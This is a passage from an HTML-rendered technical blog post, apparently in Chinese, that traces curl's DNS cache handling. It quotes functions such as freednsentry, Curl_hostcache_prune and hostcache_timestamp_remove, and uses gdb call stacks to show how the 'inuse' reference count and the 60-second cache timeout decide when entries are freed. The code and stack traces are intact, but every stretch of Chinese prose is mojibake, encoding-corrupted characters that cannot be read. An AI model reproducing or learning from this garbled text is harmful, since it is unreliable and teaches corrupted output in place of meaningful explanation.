class="hljs-keyword">return</span> dns;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>å…¶ä¸­ä¼šä½¿ç”¨<code>dns-&gt;inuse</code>å˜é‡èµ·åˆ°ä¸€ä¸ªå¼•ç”¨è®¡æ•°çš„ä½œç”¨ï¼Œåœ¨ç»è¿‡ç¬¬ä¸€æ¬¡æŸ¥è¯¢å¾—åˆ° DNS è®°å½•ä¹‹åï¼Œå†è¿›è¡Œ DNS æŸ¥è¯¢æ—¶ï¼Œ curl ä¼šä¼˜å…ˆåœ¨è‡ªå·±çš„å“ˆå¸Œè¡¨ä¸­æŸ¥è¯¢ï¼Œå¦‚æœæŸ¥åˆ°äº†åˆ™åˆä¼šç»´æŠ¤<code>dns-&gt;inuse</code>å°†å…¶åŠ ä¸€ã€‚</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * Curl_resolv_unlock() unlocks the given cached DNS entry. When this has been</span></span><br><span class="line"><span class="hljs-comment"> * made, the struct may be destroyed due to pruning. It is important that only</span></span><br><span class="line"><span class="hljs-comment"> * one unlock is made for each Curl_resolv() call.</span></span><br><span class="line"><span class="hljs-comment"> *</span></span><br><span class="line"><span class="hljs-comment"> * May be called with 'data' == NULL for global cache.</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Curl_resolv_unlock</span><span class="hljs-params">(struct Curl_easy *data, struct Curl_dns_entry *dns)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">if</span>(data &amp;&amp; data-&gt;share)</span><br><span class="line">    Curl_share_lock(data, CURL_LOCK_DATA_DNS, CURL_LOCK_ACCESS_SINGLE);</span><br><span class="line"></span><br><span class="line">  freednsentry(dns);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span>(data &amp;&amp; data-&gt;share)</span><br><span class="line">    Curl_share_unlock(data, CURL_LOCK_DATA_DNS);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * File-internal: release cache dns entry reference, free if inuse drops to 0</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">freednsentry</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *freethis)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_dns_entry</span> *<span class="hljs-title">dns</span> = (<span class="hljs-title">struct</span> <span class="hljs-title">Curl_dns_entry</span> *) <span class="hljs-title">freethis</span>;</span></span><br><span class="line">  DEBUGASSERT(dns &amp;&amp; (dns-&gt;inuse&gt;<span class="hljs-number">0</span>));</span><br><span class="line"></span><br><span class="line">  dns-&gt;inuse--;</span><br><span class="line">  <span class="hljs-keyword">if</span>(dns-&gt;inuse == <span class="hljs-number">0</span>) {</span><br><span class="line">    Curl_freeaddrinfo(dns-&gt;addr);</span><br><span class="line">    <span class="hljs-built_in">free</span>(dns);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>é€šè¿‡<code>Curl_resolv_unlock</code>å‡½æ•°åœ¨æ¯æ¬¡é€šä¿¡ç»“æŸåè°ƒç”¨<code>freednsentry</code>å°†<code>dns-&gt;inuse</code>å‡ä¸€ï¼Œä½†æ˜¯æ­¤æ—¶ç»“æŸä¹‹å<code>dns-&gt;inuse</code>çš„å€¼ä»ä¸º 1 ï¼Œæ‰€ä»¥ä¸‹æ¬¡è¿›è¡Œ DNS æŸ¥è¯¢çš„æ—¶å€™è¿˜ä¼šä½¿ç”¨ hash é‡Œçš„ DNS è®°å½•ï¼Œæ­¤æ—¶çš„è°ƒç”¨æ ˆå¦‚ä¸‹æ‰€ç¤ºï¼ˆæˆ‘ä»¬è¿™é‡Œç§°ä¸ºè°ƒç”¨æ ˆ A ï¼‰ï¼š</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#<span class="hljs-number">0</span>  freednsentry (freethis=<span class="hljs-number">0x5555555d8728</span>) at hostip.c:<span class="hljs-number">838</span></span><br><span class="line">#<span class="hljs-number">1</span>  <span class="hljs-number">0x00007ffff7f0b20e</span> <span class="hljs-keyword">in</span> Curl_resolv_unlock (data=<span class="hljs-number">0x5555555d8728</span>, dns=<span class="hljs-number">0x5555555d1d38</span>) at hostip.c:<span class="hljs-number">828</span></span><br><span class="line">#<span class="hljs-number">2</span>  <span class="hljs-number">0x00007ffff7f2720e</span> <span class="hljs-keyword">in</span> multi_done (data=<span class="hljs-number">0x5555555d8728</span>, status=CURLE_OK, premature=<span class="hljs-literal">false</span>) at multi.c:<span class="hljs-number">620</span></span><br><span class="line">#<span class="hljs-number">3</span>  <span class="hljs-number">0x00007ffff7f2a902</span> <span class="hljs-keyword">in</span> multi_runsingle (multi=<span class="hljs-number">0x5555555d4d18</span>, nowp=<span class="hljs-number">0x7fffffffdae0</span>, data=<span class="hljs-number">0x5555555d8728</span>) at multi.c:<span class="hljs-number">2227</span></span><br><span class="line">#<span class="hljs-number">4</span>  <span class="hljs-number">0x00007ffff7f2af09</span> <span class="hljs-keyword">in</span> curl_multi_perform (multi=<span class="hljs-number">0x5555555d4d18</span>, running_handles=<span class="hljs-number">0x7fffffffdbd0</span>) at multi.c:<span class="hljs-number">2412</span></span><br><span class="line">#<span class="hljs-number">5</span>  <span class="hljs-number">0x00007ffff7ef75fb</span> <span class="hljs-keyword">in</span> easy_transfer (multi=<span class="hljs-number">0x5555555d4d18</span>) at easy.c:<span class="hljs-number">606</span></span><br><span class="line">#<span class="hljs-number">6</span>  <span class="hljs-number">0x00007ffff7ef7875</span> <span class="hljs-keyword">in</span> easy_perform (data=<span class="hljs-number">0x5555555d8728</span>, events=<span class="hljs-literal">false</span>) at easy.c:<span class="hljs-number">696</span></span><br><span class="line">#<span class="hljs-number">7</span>  <span class="hljs-number">0x00007ffff7ef78e0</span> <span class="hljs-keyword">in</span> curl_easy_perform (data=<span class="hljs-number">0x5555555d8728</span>) at easy.c:<span class="hljs-number">715</span></span><br><span class="line">#<span class="hljs-number">8</span>  <span class="hljs-number">0x000055555557abb9</span> <span class="hljs-keyword">in</span> serial_transfers (global=<span class="hljs-number">0x7fffffffde20</span>, share=<span class="hljs-number">0x5555555d26d8</span>) at tool_operate.c:<span class="hljs-number">2326</span></span><br><span class="line">#<span class="hljs-number">9</span>  <span class="hljs-number">0x000055555557b099</span> <span class="hljs-keyword">in</span> run_all_transfers (global=<span class="hljs-number">0x7fffffffde20</span>, share=<span class="hljs-number">0x5555555d26d8</span>, result=CURLE_OK) at tool_operate.c:<span class="hljs-number">2504</span></span><br><span class="line">#<span class="hljs-number">10</span> <span class="hljs-number">0x000055555557b3d9</span> <span class="hljs-keyword">in</span> operate (global=<span class="hljs-number">0x7fffffffde20</span>, argc=<span class="hljs-number">3</span>, argv=<span class="hljs-number">0x7fffffffdf98</span>) at tool_operate.c:<span class="hljs-number">2620</span></span><br><span class="line">#<span class="hljs-number">11</span> <span class="hljs-number">0x0000555555570991</span> <span class="hljs-keyword">in</span> main (argc=<span class="hljs-number">3</span>, argv=<span class="hljs-number">0x7fffffffdf98</span>) at tool_main.c:<span class="hljs-number">277</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>å¹¶ä¸”æˆ‘ä»¬ä¹Ÿæ³¨æ„åˆ°åªæœ‰å½“<code>dns-&gt;inuse</code>ä¸º 0 çš„æ—¶å€™ï¼Œ curl æ‰ä¼šå°†<code>dns-&gt;addr</code>é‡Šæ”¾æ‰ï¼Œæ‰€ä»¥å¯¹äºæˆ‘ä»¬æ¥è¯´ï¼Œéœ€è¦å…³æ³¨ä»€ä¹ˆæ—¶å€™æ‰èƒ½è®©<code>dns-&gt;inuse</code>ä¸º 0 ï¼Œä¹Ÿå°±æ˜¯è¯´ä»€ä¹ˆæ—¶å€™ curl ä¼šæ‰§è¡Œä¸¤æ¬¡<code>freednsentry</code> å‡½æ•°å°†å…¶å‡å°‘åˆ°äº† 0 ã€‚ï¼ˆå› ä¸º curl å½“ä¸­åªæœ‰<code>freednsentry</code>å‡½æ•°å¯¹<code>dns-&gt;inuse</code>è¿›è¡Œäº†å‡ä¸€æ“ä½œï¼‰</p><p>ç»è¿‡è°ƒè¯•ï¼Œå‘ç° curl åœ¨ç»è¿‡ä¸Šé¢çš„è°ƒç”¨æ ˆåï¼Œå†æ¬¡ç»è¿‡ä¸‹é¢çš„è°ƒç”¨æ ˆï¼ˆæˆ‘ä»¬è¿™é‡Œç§°ä¸ºè°ƒç”¨æ ˆ B ï¼‰ä¼šå†æ¬¡è°ƒç”¨<code>freednsentry</code>å‡½æ•°å°†<code>dns-&gt;inuse</code>å‡å°‘åˆ° 0 ã€‚</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#<span class="hljs-number">0</span>  freednsentry (freethis=<span class="hljs-number">0x5555556bab48</span>) at hostip.c:<span class="hljs-number">838</span></span><br><span class="line">#1  0x00007ffff7f08c9f in hash_element_dtor (user=0x5555555d2758, element=0x5555555d2b48) at hash.c:41</span><br><span class="line">#2  0x00007ffff7f1d4a5 in Curl_llist_remove (list=0x5555555d19e8, e=0x5555555d2b48, user=0x5555555d2758) at llist.c:130</span><br><span class="line">#3  0x00007ffff7f09283 in Curl_hash_clean_with_criterium (h=0x5555555d2758, user=0x7fffffffd830, comp=0x7ffff7f0a3e9 &lt;hostcache_timestamp_remove&gt;) at hash.c:249</span><br><span class="line">#4  0x00007ffff7f0a494 in hostcache_prune (hostcache=0x5555555d2758, cache_timeout=60, now=1615184672) at hostip.c:217</span><br><span class="line">#5  0x00007ffff7f0a546 in Curl_hostcache_prune (data=0x5555555d8728) at hostip.c:241</span><br><span class="line">#6  0x00007ffff7f2722c in multi_done (data=0x5555555d8728, status=CURLE_OK, premature=false) at multi.c:623</span><br><span class="line">#7  0x00007ffff7f2a902 in multi_runsingle (multi=0x5555555d4d18, nowp=0x7fffffffdae0, data=0x5555555d8728) at multi.c:2227</span><br><span class="line">#8  0x00007ffff7f2af09 in curl_multi_perform (multi=0x5555555d4d18, running_handles=0x7fffffffdbd0) at multi.c:2412</span><br><span class="line">#9  0x00007ffff7ef75fb in easy_transfer (multi=0x5555555d4d18) at easy.c:606</span><br><span class="line">#10 0x00007ffff7ef7875 in easy_perform (data=0x5555555d8728, events=false) at easy.c:696</span><br><span class="line">#11 0x00007ffff7ef78e0 in curl_easy_perform (data=0x5555555d8728) at easy.c:715</span><br><span class="line">#12 0x000055555557abb9 in serial_transfers (global=0x7fffffffde20, share=0x5555555d26d8) at tool_operate.c:2326</span><br><span class="line">#13 0x000055555557b099 in run_all_transfers (global=0x7fffffffde20, share=0x5555555d26d8, result=CURLE_OK) at tool_operate.c:2504</span><br><span class="line">#14 0x000055555557b3d9 in operate (global=0x7fffffffde20, argc=3, argv=0x7fffffffdf98) at tool_operate.c:2620</span><br><span class="line">#15 0x0000555555570991 in main (argc=3, argv=0x7fffffffdf98) at tool_main.c:277</span><br></pre></td></tr></tbody></table></figure><p></p><p>è€Œè¿™ä¸¤æ¬¡è°ƒç”¨æ ˆçš„ä¸»è¦å…³ç³»åœ¨<code>multi_done</code>å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ lib/multi.c#619 å¤„æ‰¾åˆ°å¦‚ä¸‹ä»£ç ï¼š</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(conn-&gt;dns_entry) {</span><br><span class="line">  Curl_resolv_unlock(data, conn-&gt;dns_entry); <span class="hljs-comment">/* done with this */</span></span><br><span class="line">  conn-&gt;dns_entry = <span class="hljs-literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line">Curl_hostcache_prune(data);</span><br><span class="line">Curl_safefree(data-&gt;state.ulbuf);</span><br></pre></td></tr></tbody></table></figure><p></p><p>æ‰€ä»¥è®²é“ç†çš„è¯ï¼Œåœ¨ç»è¿‡è°ƒç”¨æ ˆ A ä¹‹åï¼Œä¹Ÿå°±æ˜¯ç»è¿‡<code>Curl_resolv_unlock</code>å‡½æ•°å°†<code>inuse</code>å‡ä¸€ä¹‹åï¼Œç†è®ºä¸Šåº”è¯¥åˆä¼šç»è¿‡<code>Curl_hostcache_prune</code>å‡½æ•°å°†<code>inuse</code>å‡ä¸€æ‰å¯¹ï¼Œä½†æ˜¯å®é™…ä¸Šå¹¶æ²¡æœ‰ã€‚è€Œ<code>Curl_resolv_unlock</code>å‡½æ•°æˆ‘ä»¬ä¸Šé¢çœ‹è¿‡ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆå¤šä½™çš„æ“ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦çœ‹ä¸€ä¸‹<code>Curl_hostcache_prune</code>ä¸ºä»€ä¹ˆæ²¡æœ‰å°†<code>inuse</code>å‡ä¸€ã€‚</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * Library-wide function for pruning the DNS cache. This function takes and</span></span><br><span class="line"><span class="hljs-comment"> * returns the appropriate locks.</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Curl_hostcache_prune</span><span class="hljs-params">(struct Curl_easy *data)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">time_t</span> now;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span>((data-&gt;<span class="hljs-built_in">set</span>.dns_cache_timeout == <span class="hljs-number">-1</span>) || !data-&gt;dns.hostcache)</span><br><span class="line">    <span class="hljs-comment">/* cache forever means never prune, and NULL hostcache means</span></span><br><span class="line"><span class="hljs-comment">       we can't do it */</span></span><br><span class="line">    <span class="hljs-keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span>(data-&gt;share)</span><br><span class="line">    Curl_share_lock(data, CURL_LOCK_DATA_DNS, CURL_LOCK_ACCESS_SINGLE);</span><br><span class="line"></span><br><span class="line">  time(&amp;now);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/* Remove outdated and unused entries from the hostcache */</span></span><br><span class="line">  hostcache_prune(data-&gt;dns.hostcache,</span><br><span class="line">                  data-&gt;<span class="hljs-built_in">set</span>.dns_cache_timeout,</span><br><span class="line">                  now);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span>(data-&gt;share)</span><br><span class="line">    Curl_share_unlock(data, CURL_LOCK_DATA_DNS);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>å¥½äº†ï¼Œçœ‹åˆ°<code>time_t now</code>å°±å·®ä¸å¤šçŒœåˆ°å¤§æ¦‚äº†ï¼Œæ‰€ä»¥æŒ‰ç…§ä¹‹å‰çš„ç°è±¡ï¼Œ<code>Curl_hostcache_prune</code>å‡½æ•°æ²¡æœ‰å°†<code>inuse</code>å‡ä¸€ï¼Œå¯èƒ½æ˜¯åœ¨ç¬¬ä¸€ä¸ªåˆ¤æ–­è¯­å¥å°±ç›´æ¥è¿”å›äº†ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬å…ˆæ£€æŸ¥ç¬¬ä¸€ä¸ªæ¡ä»¶è¯­å¥å½“ä¸­çš„æ¡ä»¶ã€‚</p><p>ç¬¬ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„å‚æ•°<code>data-&gt;set.dns_cache_timeout</code>ï¼Œåœ¨ curl æºç å½“ä¸­å”¯äºŒå¯¹å…¶è¿›è¡Œèµ‹å€¼æ“ä½œçš„åœ°æ–¹åœ¨ lib/setopt.c#173 :</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">case</span> CURLOPT_DNS_CACHE_TIMEOUT:</span><br><span class="line">  arg = va_arg(param, <span class="hljs-keyword">long</span>);</span><br><span class="line">  <span class="hljs-keyword">if</span>(arg &lt; <span class="hljs-number">-1</span>)</span><br><span class="line">    <span class="hljs-keyword">return</span> CURLE_BAD_FUNCTION_ARGUMENT;</span><br><span class="line">  data-&gt;<span class="hljs-built_in">set</span>.dns_cache_timeout = arg;</span><br><span class="line">  <span class="hljs-keyword">break</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>æ ¹æ®æ–‡ä»¶åä»¥åŠä¸Šä¸‹æ–‡ï¼Œæˆ‘ä»¬ä¸éš¾æŸ¥åˆ°è¿™æ˜¯å¯¹äºç”¨æˆ·ä¼ å…¥çš„å‚æ•°è¿›è¡Œçš„é…ç½® <a href="https://curl.se/libcurl/c/CURLOPT_DNS_CACHE_TIMEOUT.html" target="_blank" rel="noopener">CURLOPT_DNS_CACHE_TIMEOUT explained</a> ï¼Œå¹¶ä¸æ˜¯æˆ‘ä»¬éœ€è¦çš„ã€‚è¿˜æœ‰ä¸€å¤„èµ‹å€¼è¯­å¥åˆ™æ˜¯åœ¨ lib/url.c#511 å¤„ï¼Œåœ¨ç»“æ„ä½“å½“ä¸­å¯¹å…¶è¿›è¡Œäº†èµ‹å€¼ã€‚</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">set</span>-&gt;dns_cache_timeout = <span class="hljs-number">60</span>; <span class="hljs-comment">/* Timeout every 60 seconds by default */</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>å¹¶ä¸”æˆ‘ä»¬è¿™é‡Œè¿˜èƒ½ä»æ³¨é‡Šä¸­è·å¾—ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœä¸æ˜¯ç”¨æˆ·è‡ªå®šä¹‰å‚æ•°èµ‹å€¼ï¼Œé»˜è®¤ DNS ç¼“å­˜æ—¶é—´ä¸º 60s ã€‚</p><p>å¦ä¸€ä¸ªå‚æ•°<code>data-&gt;dns.hostcache</code>ï¼Œæˆ‘ä»¬ä¹‹å‰åœ¨<code>Curl_hash_add</code>å‡½æ•°ä¸­ï¼Œç”¨ä½œè¡¨ç¤ºå“ˆå¸Œè®°å½•ï¼Œè¿™é‡Œä¸ä¸ºç©ºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œ<code>Curl_hostcache_prune</code>ä¸­çš„ç¬¬ä¸€ä¸ªæ¡ä»¶è¯­å¥ä¸ä¼šç›´æ¥<code>return</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ç»§ç»­è·Ÿè¿›è¯¥å‡½æ•°ï¼Œæ¥ä¸‹æ¥å°±åˆ°äº†<code>hostcache_prune</code>å‡½æ•°ã€‚</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * Prune the DNS cache. This assumes that a lock has already been taken.</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="line">hostcache_prune(struct Curl_hash *hostcache, <span class="hljs-keyword">long</span> cache_timeout, <span class="hljs-keyword">time_t</span> now)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hostcache_prune_data</span> <span class="hljs-title">user</span>;</span></span><br><span class="line"></span><br><span class="line">  user.cache_timeout = cache_timeout;</span><br><span class="line">  user.now = now;</span><br><span class="line"></span><br><span class="line">  Curl_hash_clean_with_criterium(hostcache,</span><br><span class="line">                                 (<span class="hljs-keyword">void</span> *) &amp;user,</span><br><span class="line">                                 hostcache_timestamp_remove);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>æ„Ÿè§‰çœ‹åˆ°è¿™é‡Œå·²ç»èƒ½å¾ˆæ˜æ˜¾çš„çœ‹åˆ° curl åšæ³•çš„æ„å›¾äº†ï¼Œä¼ å…¥å‡½æ•°çš„ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºç°åœ¨çš„æ—¶é—´ï¼Œç¬¬äºŒä¸ªå‚æ•°è¿™é‡Œä¸ºé»˜è®¤çš„ DNS ç¼“å­˜æ—¶é—´ä¸º 60s ï¼Œè¿›è¡Œèµ‹å€¼æ“ä½œåï¼Œè¿›å…¥åˆ°<code>hostcache_timestamp_remove</code>å‡½æ•°ï¼š</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* Cleans all entries that pass the comp function criteria. */</span></span><br><span class="line"><span class="hljs-keyword">void</span></span><br><span class="line">Curl_hash_clean_with_criterium(struct Curl_hash *h, <span class="hljs-keyword">void</span> *user,</span><br><span class="line">                               <span class="hljs-keyword">int</span> (*comp)(<span class="hljs-keyword">void</span> *, <span class="hljs-keyword">void</span> *))</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_llist_element</span> *<span class="hljs-title">le</span>;</span></span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_llist_element</span> *<span class="hljs-title">lnext</span>;</span></span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_llist</span> *<span class="hljs-title">list</span>;</span></span><br><span class="line">  <span class="hljs-keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span>(!h)</span><br><span class="line">    <span class="hljs-keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; h-&gt;slots; ++i) {</span><br><span class="line">    <span class="hljs-built_in">list</span> = &amp;h-&gt;table[i];</span><br><span class="line">    le = <span class="hljs-built_in">list</span>-&gt;head; <span class="hljs-comment">/* get first list entry */</span></span><br><span class="line">    <span class="hljs-keyword">while</span>(le) {</span><br><span class="line">      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_hash_element</span> *<span class="hljs-title">he</span> = <span class="hljs-title">le</span>-&gt;<span class="hljs-title">ptr</span>;</span></span><br><span class="line">      lnext = le-&gt;next;</span><br><span class="line">      <span class="hljs-comment">/* ask the callback function if we shall remove this entry or not */</span></span><br><span class="line">      <span class="hljs-keyword">if</span>(comp == <span class="hljs-literal">NULL</span> || comp(user, he-&gt;ptr)) {</span><br><span class="line">        Curl_llist_remove(<span class="hljs-built_in">list</span>, le, (<span class="hljs-keyword">void</span> *) h);</span><br><span class="line">        --h-&gt;<span class="hljs-built_in">size</span>; <span class="hljs-comment">/* one less entry in the hash now */</span></span><br><span class="line">      }</span><br><span class="line">      le = lnext;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * This function is set as a callback to be called for every entry in the DNS</span></span><br><span class="line"><span class="hljs-comment"> * cache when we want to prune old unused entries.</span></span><br><span class="line"><span class="hljs-comment"> *</span></span><br><span class="line"><span class="hljs-comment"> * Returning non-zero means remove the entry, return 0 to keep it in the</span></span><br><span class="line"><span class="hljs-comment"> * cache.</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="line">hostcache_timestamp_remove(<span class="hljs-keyword">void</span> *datap, <span class="hljs-keyword">void</span> *hc)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hostcache_prune_data</span> *<span class="hljs-title">data</span> =</span></span><br><span class="line"><span class="hljs-class">    (<span class="hljs-title">struct</span> <span class="hljs-title">hostcache_prune_data</span> *) <span class="hljs-title">datap</span>;</span></span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_dns_entry</span> *<span class="hljs-title">c</span> = (<span class="hljs-title">struct</span> <span class="hljs-title">Curl_dns_entry</span> *) <span class="hljs-title">hc</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span> != c-&gt;timestamp)</span><br><span class="line">    &amp;&amp; (data-&gt;now - c-&gt;timestamp &gt;= data-&gt;cache_timeout);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>åœ¨è¿™é‡Œä¸€åˆ‡çœŸç›¸å¤§ç™½ï¼Œæ­£å¦‚ä»£ç æ‰€ç¤ºï¼Œåœ¨<code>hostcache_timestamp_remove</code>ä¸­ä¼šä½¿ç”¨ç°åœ¨çš„æ—¶é—´ä¸ curl å“ˆå¸Œè¡¨ä¸­è®°å½•çš„æ—¶é—´ç›¸å‡ï¼Œç»“æœæ˜¯å¦å¤§äº<code>data-&gt;cache_timeout</code>ï¼Œåœ¨è¿™é‡Œä¹Ÿå°±æ˜¯é»˜è®¤çš„ 60s ï¼Œå¦‚æœå¤§äºåˆ™åœ¨<code>Curl_hash_clean_with_criterium</code>æ¸…ç©ºå¯¹åº”çš„å“ˆå¸Œè¡¨ï¼Œæ¥ç€ curl æ‰ä¼šè¿›è¡Œä¸‹ä¸€æ¬¡çœŸæ­£çš„ DNS æŸ¥è¯¢ã€‚</p><p>æ‰€ä»¥ï¼Œä»ä»£ç 